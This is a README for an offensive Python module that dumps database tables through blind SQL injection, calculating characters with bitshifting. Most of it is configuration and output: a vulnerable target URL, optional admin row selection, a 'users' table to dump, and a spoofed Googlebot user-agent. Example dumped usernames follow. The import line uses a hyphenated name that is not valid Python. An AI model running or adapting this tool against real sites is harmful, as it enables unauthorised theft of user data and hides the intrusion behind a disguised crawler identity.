# Blind SQL Injection via Bitshifting

This is a module that performs blind SQL injection by using the bitshifting method to **calculate** characters instead of guessing them. It requires 7/8 requests per character, depending on the configuration.

## Usage

```
import blind-sql-bitshifting as x

# Edit this dictionary to configure attack vectors
x.options
```

### Example configuration:

```
# Vulnerable link
x.options["target"] = "http://www.example.com/index.php?id=1"

# Specify cookie (optional)
x.options["cookies"] = ""

# Specify a condition for a specific row, e.g. 'uid=1' for admin (optional)
x.options["row_condition"] = ""

# Boolean option for following redirections
x.options["follow_redirections"] = 0

# Specify user-agent
x.options["user_agent"] = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# Specify table to dump
x.options["table_name"] = "users"

# Specify columns to dump
x.options["columns"] = "id, username"

# String to check for on page after successful statement
x.options["truth_string"] = "<p id='success'>true</p>"

# See below
x.options["assume_only_ascii"] = 1
```

The `assume_only_ascii` option makes the module assume that the characters it's dumping are all ASCII. Since the ASCII charset only goes up to `127`, we can set the first bit to `0` and not worry about calculating it. That's a `12.5%` reduction in requests. Testing locally, this yeilded an average speed increase of `15%`. Of course this can cause issues when dumping chars that are outside of the ASCII range. By default, it's set to `0`.

Once configured:

```
data = x.exploit()
```

This returns a 2-dimensional array, with each sub-array containing a single row, the first being the column headers.

Example output:

`[['id', 'username'], ['1', 'eclipse'], ['2', 'dotcppfile'], ['3', 'Acey'], ['4', 'Wardy'], ['5', 'idek']]`

Optionally, your scripts can then harness the [tabulate](https://pypi.python.org/pypi/tabulate) module to output the data:

```
from tabulate import tabulate

data = x.exploit()

print tabulate(data,
               headers='firstrow',  # This specifies to use the first row as the column headers.
               tablefmt='psql')     # Using the SQL output format. Other formats can be used.
```

This would output:

```
+------+------------+
|   id | username   |
|------+------------|
|    1 | eclipse    |
|    2 | dotcppfile |
|    3 | Acey       |
|    4 | Wardy      |
|    5 | idek       |
+------+------------+
```
